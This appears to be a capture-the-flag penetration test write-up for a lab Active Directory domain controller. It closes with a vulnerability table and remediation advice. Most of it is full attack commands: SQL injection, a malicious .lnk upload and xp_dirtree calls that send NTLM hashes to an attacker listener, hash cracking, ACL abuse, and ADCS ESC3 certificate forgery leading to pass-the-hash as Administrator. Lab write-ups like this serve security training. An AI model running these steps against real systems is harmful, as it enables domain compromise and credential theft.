---
{"dg-publish":true,"permalink":"/shadow-gate2/","dg-note-properties":{}}
---


# ShadowGate2 — Penetration Test Report

---

|Field|Value|
|---|---|
|**Date**|2026-08-09|
|**Tester**|Eleni Tsermentseli|
|**Domain**|`shadowgate.local`|
|**Target**|`10.1.108.116` (SG-DC01.shadowgate.local)|
|**Difficulty**|Easy|
|**Scenario**|Black Box — No credentials provided|

---

## Enumeration

### Nmap

Ran a full port scan against the target:

```shell
nmap -p- 10.1.108.116 -T4 --min-rate 5000 | grep open
```

Identified a classic Active Directory Domain Controller with a web server:

- **53** — DNS
- **80** — HTTP (IIS 10.0)
- **88** — Kerberos
- **135/139/445** — SMB (signing: **True**)
- **389/3268** — LDAP (Domain: `shadowgate.local`)
- **3389** — RDP
- **9389** — ADWS

Key findings:

- Domain: `shadowgate.local`
- DC hostname: `SG-DC01.shadowgate.local`
- OS: Windows Server 2019 (Build 17763)
- **Web server present on port 80** — ShadowGate corporate website

---

## Web Enumeration

### Corporate Website

Browsed to `http://10.1.108.116` — discovered the ShadowGate corporate website. Key findings:

- **`/our-team.html`** — Team members page with names and roles
- **`/pictures/`** — 403 Forbidden (photo directory)
- A hidden `dev.shadowgate.local` subdomain discovered in page source:

```javascript
const DEV_BASE_URL = "http://dev.shadowgate.local";
const ENV = "production";
```

Added to `/etc/hosts`:

```
10.1.108.116 dev.shadowgate.local shadowgate.local SG-DC01
```

### Team Member Enumeration

Extracted staff names from `/our-team.html`:

|Name|Role|
|---|---|
|Mitch Ressek|Lead Developer & Platform Admin|
|Bogdan Radzik|IT Admin & Database Specialist|
|Milo Weis|Junior IT Administrator|
|Oscar Mazerath|Security Operations Analyst|
|Sam Hadges|_(Inactive)_|
|Daniel Ramus|Security Infrastructure Engineer|
|Ryan James|Client Security Specialist|

Also noted from the **File Upload Workflow** section:

> _"All uploaded files are reviewed and processed by **mitch.r**"_

This revealed the **AD username format**: `firstname.initial` (e.g., `mitch.r`).

### Username Validation (Kerbrute)

Generated a username list and validated against Kerberos:

```shell
./kerbrute userenum users4.txt -d shadowgate.local --dc 10.1.108.116
```

**Valid usernames confirmed:**

- `mitch.r`
- `bogdan.r`
- `milo.w`
- `oscar.m`
- `daniel.r`
- `ryan.j`

---

## Dev Portal — SQL Injection

### Discovery

`http://dev.shadowgate.local` — ASP.NET login portal ("Dev File Upload Portal").

Tested for SQL injection on the login form:

```python
# Payload that bypassed authentication
txtUser: ' OR 1=1--
txtPass: password
```

**Result:** SQL error revealing the database backend and query structure:

```
System.Data.SqlClient.SqlException: Invalid object name 'Users'.
Source File: c:\inetpub\dev_shadowgate\login.aspx.cs
```

Confirmed injectable — the application uses MSSQL with verbose error messages enabled.

### Upload Page — No Auth Required

Discovered that `http://dev.shadowgate.local/upload/upload.aspx` was **publicly accessible without authentication**.

---

## NTLM Hash Capture (NTLM Theft)

### Generating Malicious Files

Used **ntlm_theft** to generate a malicious `.lnk` file pointing to our Responder listener:

```shell
cd ~/ntlm_theft
python3 ntlm_theft.py -g lnk -s 10.200.79.101 -f project
```

### Uploading to Dev Portal

Uploaded the malicious `.lnk` to the upload portal:

```shell
curl -s -X POST http://dev.shadowgate.local/upload/upload.aspx \
  --data-urlencode "Button1=Upload to ShadowGate Servers" \
  -F "FileUpload1=@project/project.lnk;filename=project.lnk"
```

### Capturing the Hash

Started Responder on `tun0`:

```shell
sudo responder -I tun0
```

When `mitch.r` (the file reviewer) opened the Share folder, Windows automatically attempted to load the `.lnk` shortcut, sending an NTLMv2 authentication request to our listener:

```
[SMB] NTLMv2-SSP Username : SHADOWGATE\mitch.r
[SMB] NTLMv2-SSP Hash     : mitch.r::SHADOWGATE:62954ec6a12ae0f6:...
```

### Cracking the Hash

```shell
hashcat -a 0 -m 5600 mitchr.hash /usr/share/wordlists/rockyou.txt
```

**Password found:** `snitch1993`

Credentials: `mitch.r:snitch1993`

---

## SMB Enumeration with Valid Credentials

```shell
netexec smb 10.1.108.116 -u 'mitch.r' -p 'snitch1993' --shares
netexec smb 10.1.108.116 -u 'mitch.r' -p 'snitch1993' --users
```

Notable share: **`dev$`** (READ, WRITE) — internal development share.

---

## BloodHound Enumeration

```shell
bloodhound-python -d shadowgate.local -u mitch.r -p 'snitch1993' \
  -ns 10.1.108.116 -c DCOnly --zip
```

### Attack Path Identified

```
mitch.r
    ↓ ForceChangePassword → milo.w
milo.w
    ↓ WriteOwner + GenericAll → svc_mssql
svc_mssql → MSSQL xp_cmdshell → NTLMv2 relay (Responder)
    ↓ NTLMv2 Hash → bogdan.r:bogdan0126
bogdan.r → WinRM (Pwn3d!) → GenericAll → oscar.m
oscar.m → WinRM → Restore deleted sam.h
sam.h → ADCS ESC3
    ↓ Certificate as Administrator
NT Hash → Administrator
```

---

## ACL Abuse Chain

### mitch.r → milo.w (ForceChangePassword)

```shell
net rpc password milo.w 'Pwned123@!' \
  -U 'shadowgate.local/mitch.r%snitch1993' -S 10.1.108.116
```

### milo.w → svc_mssql (WriteOwner + GenericAll)

```shell
bloodyAD --host 10.1.108.116 -d shadowgate.local -u milo.w -p 'Pwned123@!' \
  set owner 'svc_mssql' 'milo.w'

bloodyAD --host 10.1.108.116 -d shadowgate.local -u milo.w -p 'Pwned123@!' \
  add genericAll 'svc_mssql' 'milo.w'

net rpc password svc_mssql 'Pwned123@!' \
  -U 'shadowgate.local/milo.w%Pwned123@!' -S 10.1.108.116
```

---

## MSSQL — NTLMv2 Relay via xp_dirtree

Connected to MSSQL as `svc_mssql`:

```shell
impacket-mssqlclient 'shadowgate.local/svc_mssql:Pwned123@!'@10.1.108.116 -windows-auth
```

Enabled `xp_cmdshell` and triggered NTLM authentication to Responder:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_dirtree '\\10.200.79.101\share', 1, 1;
```

Captured NTLMv2 hash for `bogdan.r`. Cracked with hashcat:

**Password found:** `bogdan0126`

---

## Shell as bogdan.r → oscar.m

```shell
evil-winrm -i 10.1.108.116 -u 'bogdan.r' -p 'bogdan0126'
```

`bogdan.r` had **GenericAll** over `oscar.m`. Reset password and fixed logon hours:

```shell
net rpc password oscar.m 'Pwned123@!' \
  -U 'shadowgate.local/bogdan.r%bogdan0126' -S 10.1.108.116

bloodyAD --host 10.1.108.116 -d shadowgate.local -u bogdan.r -p 'bogdan0126' \
  set object oscar.m logonHours
```

### User Flag

```shell
evil-winrm -i 10.1.108.116 -u 'oscar.m' -p 'Pwned123@!'
type C:\Users\oscar.m\Desktop\user.txt
```

> **Flag:** `FLAG[shadowgate_user_integrity_breach_7f2c]`

---

## Restore Deleted Account — sam.h

As `oscar.m`, restored the deleted `sam.h` account (found in AD Recycle Bin):

```shell
bloodyAD --host 10.1.108.116 -d shadowgate.local -u oscar.m -p 'Pwned123@!' \
  set restore 'sam.h'

bloodyAD --host 10.1.108.116 -d shadowgate.local -u oscar.m -p 'Pwned123@!' \
  set password 'sam.h' 'Pwned123@!'
```

---

## ADCS Enumeration

```shell
/home/kali/.local/bin/certipy find -u 'sam.h@shadowgate.local' \
  -p 'Pwned123@!' -dc-ip 10.1.108.116 \
  -target SG-DC01.shadowgate.local -vulnerable -ldap-scheme ldap -stdout
```

### Vulnerable Templates Found

|Vulnerability|Details|
|---|---|
|**ESC3**|`Shadowgate-EnrollmentAgent` — Certificate Request Agent EKU|
|**ESC7**|`sam.h` has ManageCa rights — dangerous CA permissions|

---

## ESC3 Exploitation

### Step 1 — Request Enrollment Agent Certificate

```shell
/home/kali/.local/bin/certipy req \
  -u 'sam.h@shadowgate.local' -p 'Pwned123@!' \
  -dc-ip 10.1.108.116 -target SG-DC01.shadowgate.local \
  -ca 'Shadowgate-CA' -template 'Shadowgate-EnrollmentAgent' \
  -ldap-scheme ldap -timeout 30
```

Saved to `sam.h.pfx`.

### Step 2 — Request Certificate on Behalf of Administrator

```shell
/home/kali/.local/bin/certipy req \
  -u 'sam.h@shadowgate.local' -p 'Pwned123@!' \
  -dc-ip 10.1.108.116 -target SG-DC01.shadowgate.local \
  -ca 'Shadowgate-CA' -template 'User' \
  -on-behalf-of 'SHADOWGATE\Administrator' \
  -pfx 'sam.h.pfx' -ldap-scheme ldap -timeout 30
```

Saved to `administrator.pfx`.

### Step 3 — Authenticate and Retrieve NT Hash

```shell
/home/kali/.local/bin/certipy auth -pfx administrator.pfx -dc-ip 10.1.108.116
```

**NT Hash retrieved:**

```
aad3b435b51404eeaad3b435b51404ee:a07b7bbc98b574afe52bbeb5d07d9c0a
```

---

## Shell as Administrator

```shell
evil-winrm -i 10.1.108.116 -u Administrator -H 'a07b7bbc98b574afe52bbeb5d07d9c0a'
```

### Root Flag

```shell
type C:\Users\Administrator\Desktop\root.txt
```

> **Flag:** `FLAG[SamH_Tombstone_Records_NoLongerExists_But_Backups_NeverForget]`

---

## Vulnerabilities Summary

|#|Vulnerability|Severity|Impact|
|---|---|---|---|
|1|SQL Injection on dev portal login|High|Database access / Authentication bypass|
|2|Unauthenticated file upload endpoint|High|NTLM hash capture|
|3|Weak password — `mitch.r`|High|Initial AD foothold|
|4|Excessive ACL — ForceChangePassword (mitch.r → milo.w)|High|Lateral movement|
|5|Excessive ACL — WriteOwner/GenericAll (milo.w → svc_mssql)|High|Service account takeover|
|6|MSSQL xp_cmdshell enabled — SeImpersonatePrivilege|High|NTLM relay / credential capture|
|7|Excessive ACL — GenericAll (bogdan.r → oscar.m)|High|Lateral movement|
|8|AD Recycle Bin — sam.h restorable with CA rights|Critical|ADCS privilege escalation|
|9|ADCS ESC3 — Enrollment Agent misconfiguration|Critical|Domain Admin escalation|
|10|ADCS ESC7 — Dangerous CA permissions (sam.h)|Critical|Domain Admin escalation|

---

## Remediation Recommendations

- **Fix SQL Injection** — use parameterized queries in the dev portal login
- **Restrict upload endpoint** — require authentication and validate file types
- **Enforce strong passwords** — prevent weak passwords on all AD accounts
- **Review AD ACLs** — remove ForceChangePassword/WriteOwner/GenericAll where not required
- **Disable xp_cmdshell** — it should never be enabled on production MSSQL servers
- **Implement least privilege** for MSSQL service accounts
- **Audit AD Recycle Bin** — review what deleted accounts can be restored
- **Fix ADCS templates** — remove Enrollment Agent EKU or restrict enrollment rights
- **Review CA permissions** — revoke ManageCa from non-admin accounts

---

